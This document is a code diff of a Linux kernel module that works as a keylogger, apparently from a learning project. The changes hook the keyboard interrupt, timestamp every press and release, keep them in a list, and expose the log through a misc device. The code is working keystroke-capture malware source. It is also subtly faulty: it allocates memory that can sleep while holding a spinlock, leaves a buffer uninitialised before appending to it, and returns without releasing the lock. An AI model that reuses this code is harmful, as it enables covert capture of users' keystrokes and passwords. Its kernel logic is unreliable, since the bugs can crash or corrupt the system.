@@ -4,9 +4,7 @@
 
 DEFINE_MUTEX(keyboard_mutex);
 DEFINE_SPINLOCK(keyboard_spinlock);
-
-static int windex	= -1;
-static int rindex	= -1;
+LIST_HEAD(keypress_list);
 
 static struct key_press keys[CB_SIZE];
 
@@ -19,6 +17,11 @@ static const struct usb_device_id usb_module_id_table[2] = {
 };
 MODULE_DEVICE_TABLE(usb, usb_module_id_table);
 
+static u8 scancodes[CB_SIZE] = {0x0};
+static int windex = -1;
+static int rindex = -1;
+static size_t list_size = 0;
+
 // helpers
 static int is_key_pressed(unsigned int scancode)
 {
@@ -27,7 +30,7 @@ static int is_key_pressed(unsigned int scancode)
 
 struct scan_code codes[] = {
 	{0x0, "NULL", PRESSED},
-	{0x1, "escape", PRESSED},
+	{0x1, "Escape", PRESSED},
 	{0x2, "1", PRESSED},
 	{0x3, "2", PRESSED},
 	{0x4, "3", PRESSED},
@@ -37,11 +40,11 @@ struct scan_code codes[] = {
 	{0x8, "7", PRESSED},
 	{0x9, "8", PRESSED},
 	{0xa, "9", PRESSED},
-	{0xb, "0 zero", PRESSED},
+	{0xb, "0 Zero", PRESSED},
 	{0xc, "-", PRESSED},
 	{0xd, "=", PRESSED},
-	{0xe, "backspace", PRESSED},
-	{0xf, "tab", PRESSED},
+	{0xe, "Backspace", PRESSED},
+	{0xf, "Tab", PRESSED},
 	{0x10, "q", PRESSED},
 	{0x11, "w", PRESSED},
 	{0x12, "e", PRESSED},
@@ -62,9 +65,9 @@ struct scan_code codes[] = {
 	{0x25, "k", PRESSED},
 	{0x26, "l", PRESSED},
 	{0x27, ";", PRESSED},
-	{0x28, "' (single quote)", PRESSED},
-	{0x29, "` (back tick)", PRESSED},
-	{0x2a, "left shift", PRESSED},
+	{0x28, "' (Single quote)", PRESSED},
+	{0x29, "` (Back tick)", PRESSED},
+	{0x2a, "Left shift", PRESSED},
 	{0x2b, "\\", PRESSED},
 	{0x2c, "z", PRESSED},
 	{0x2d, "x", PRESSED},
@@ -76,10 +79,10 @@ struct scan_code codes[] = {
 	{0x33, ",", PRESSED},
 	{0x34, ".", PRESSED},
 	{0x35, "/", PRESSED},
-	{0x36, "right shift"},
-	{0x37, "(keypad) *"},
-	{0x38, "left alt", PRESSED,},
-	{0x39, "space", PRESSED},
+	{0x36, "Right shift"},
+	{0x37, "(Keypad) *"},
+	{0x38, "Left alt", PRESSED,},
+	{0x39, "Space", PRESSED},
 	{0x3a, "CapsLock", PRESSED},
 	{0x3b, "F1", PRESSED},
 	{0x3c, "F2", PRESSED},
@@ -93,36 +96,94 @@ struct scan_code codes[] = {
 	{0x44, "F10", PRESSED},
 	{0x45, "NumberLock", PRESSED},
 	{0x46, "ScrollLock", PRESSED},
-	{0x47, "(keypad) 7", PRESSED},
-	{0x48, "(keypad) 8", PRESSED},
-	{0x49, "(keypad) 9", PRESSED},
-	{0x4a, "(keypad) -", PRESSED},
-	{0x4b, "(keypad) 4", PRESSED},
-	{0x4c, "(keypad) 5", PRESSED},
-	{0x4d, "(keypad) 6", PRESSED},
-	{0x4e, "(keypad) +", PRESSED},
-	{0x4f, "(keypad) 1", PRESSED},
-	{0x50, "(keypad) 2", PRESSED},
-	{0x51, "(keypad) 3", PRESSED},
-	{0x52, "(keypad) 0", PRESSED},
-	{0x53, "(keypad) .", PRESSED},
+	{0x47, "(Keypad) 7", PRESSED},
+	{0x48, "(Keypad) 8", PRESSED},
+	{0x49, "(Keypad) 9", PRESSED},
+	{0x4a, "(Keypad) -", PRESSED},
+	{0x4b, "(Keypad) 4", PRESSED},
+	{0x4c, "(Keypad) 5", PRESSED},
+	{0x4d, "(Keypad) 6", PRESSED},
+	{0x4e, "(Keypad) +", PRESSED},
+	{0x4f, "(Keypad) 1", PRESSED},
+	{0x50, "(Keypad) 2", PRESSED},
+	{0x51, "(Keypad) 3", PRESSED},
+	{0x52, "(Keypad) 0", PRESSED},
+	{0x53, "(Keypad) .", PRESSED},
 	{0x57, "F11", PRESSED},
 	{0x58, "F12", PRESSED},
+	{0x1c, "Enter", PRESSED},
 };
 
 // misc ops
-static ssize_t misc_read(struct file *file, char __user *buf, size_t count, loff_t *off)
+static ssize_t misc_read(struct file *filp, char __user *buffer,
+				size_t length, loff_t *offset)
 {
+	ssize_t		retval = 0;
+	size_t		count = 0;
+	size_t		s;
+	char		*klg_buffer = filp->private_data;
+
+	s = strlen(klg_buffer);
+	if (s == 0) {
+		retval = -ENODATA;
+		goto out;
+	}
+
+	if (*offset == s)
+		goto out;
+
+	if (*offset + length > s)
+		count = s - *offset;
+	if (length < s)
+		count = length;
+	else
+		count = s;
+
+	if ((copy_to_user(buffer, &klg_buffer[*offset], count))) {
+		retval = -EFAULT;
+		goto out;
+	}
+	*offset += count;
+	return count;
+
+out :
+	return retval;
+}
+
+static int misc_open(struct inode *inode, struct file *filp)
+{
+	char			*buffer;
+	char			proto[60] = {0};
+	int			index = 0;
+	int			written;
+	struct key_press	*tmp, *next;
+
+	spin_lock(&keyboard_spinlock);
+	buffer = kmalloc(sizeof(char) * (MISC_SIZE * 45), GFP_KERNEL);
+	if (!buffer)
+		return -ENOMEM;
+	list_for_each_entry_safe(tmp, next, &keypress_list, list) {
+		if (index >= (int)list_size - MISC_SIZE) {
+			written = sprintf(proto, "[%02d:%02d:%02d] (0x%02X) %s %s\n", 
+						tmp->tm.tm_hour,
+						tmp->tm.tm_min,
+						tmp->tm.tm_sec,
+						tmp->scancode,
+						tmp->status ? "pressed" : "released",
+						tmp->name
+						);
+		}
+		strncat(buffer, proto, written);
+		index++;
+	}
+	spin_unlock(&keyboard_spinlock);
+	filp->private_data = buffer;
 	return 0;
 }
 
-static int misc_open(struct inode *inode, struct file *file)
+static int misc_release(struct inode *inode, struct file *filp)
 {
-	return 0;
-}
-
-static int misc_release(struct inode *inode, struct file *file)
-{
+	kfree(filp->private_data);
 	return 0;
 }
 
@@ -139,37 +200,94 @@ static struct miscdevice keyboard_device = {
 };
 
 // irq section
+
 static int get_code_index(u8 scancode)
 {
-	for (int i = 0; i < 82; i++) {
+	for (int i = 0; i < 83; i++) {
 		if (codes[i].scancode == scancode)
 			return i;
 	}
 	return -1;
 }
 
+static struct tm get_current_time(void)
+{
+	struct timespec64 ts;
+	struct tm tm;
+
+	ktime_get_real_ts64(&ts); // Get the current time in seconds since the epoch
+	time64_to_tm(ts.tv_sec, 0, &tm); // Convert to broken-down time
+	tm.tm_hour = (tm.tm_hour + 2) % 24;
+	return tm;
+}
+
+static int add_keypress_to_list(int index, int status, struct tm tm)
+{
+	struct key_press *keypress;
+	
+	keypress = kmalloc(sizeof(struct key_press), GFP_KERNEL);	
+	if (!keypress)
+		return -ENOMEM;
+	keypress->name = codes[index].name;
+	keypress->scancode = codes[index].scancode;
+	keypress->status = status;
+	keypress->tm = tm;
+	list_add_tail(&keypress->list, &keypress_list);
+	list_size++;
+	return 0;
+}
+
+static void perform_task(struct tasklet_struct *task)
+{
+	u8		scancode;
+	u8		temp_sc;
+	int		index;
+	int		pressed;
+	unsigned long	flags;
+	struct tm	tm;
+	
+	spin_lock_irqsave(&keyboard_spinlock, flags);
+	if (rindex + 1 == CB_SIZE)
+		rindex = 0;
+	scancode = scancodes[++rindex];
+	pressed	= is_key_pressed(scancode);
+	temp_sc = pressed ? scancode : (scancode - 0x80);
+	index = get_code_index(temp_sc);
+	if (index == -1)
+		goto out;
+	struct scan_code code = codes[index];
+	tm = get_current_time();
+	if (add_keypress_to_list(index, pressed, tm))
+		goto out;
+	pr_info("[%02d:%02d:%02d] (0x%02X) %s %s\n",
+			tm.tm_hour,
+			tm.tm_min,
+			tm.tm_sec,
+			scancode,
+			pressed == 1 ? "pressed " : "released",
+			code.name
+			);
+
+out:
+	spin_unlock_irqrestore(&keyboard_spinlock, flags);
+	return ;
+}
+
+DECLARE_TASKLET(keylogger_task, perform_task);
+
 static irqreturn_t keyboard_handler(int irq, void *dev_id)
 {
 	u8		scancode = inb(KEYBOARD_PORT);
-	u8		dummy_code;
-	int		pressed = is_key_pressed(scancode);
 	unsigned long	flags;
-	int		index = 0;
 
 	spin_lock_irqsave(&keyboard_spinlock, flags);
-	dummy_code = pressed ? scancode : scancode - 0x80;
-	index = get_code_index(dummy_code);
-	if (index == -1)
-		goto err;
-	struct scan_code code = codes[index];
-	pr_info("scancode = 0x%X (%u) %s name: %s\n", scancode, scancode, pressed == 1 ? "pressed" : "released", code.name);
+	if (windex + 2 == CB_SIZE)
+		windex = 0;
+	scancodes[++windex] = scancode;
 	spin_unlock_irqrestore(&keyboard_spinlock, flags);
+	tasklet_schedule(&keylogger_task);
 
 	return IRQ_HANDLED;
-err:
-	pr_info("Key is out of range\n");
-	spin_unlock_irqrestore(&keyboard_spinlock, flags);
-	return IRQ_NONE;
 }
 
 static int driver_irq_reg(void)
@@ -186,7 +304,12 @@ static int driver_irq_reg(void)
 
 static void driver_irq_unregister(void)
 {
+	struct key_press *temp, *next;
 	free_irq(PL2_IRQ, &keys);
+	list_for_each_entry_safe(temp, next, &keypress_list, list) {
+		list_del(&temp->list);
+		kfree(temp);
+	}
 }
 
 
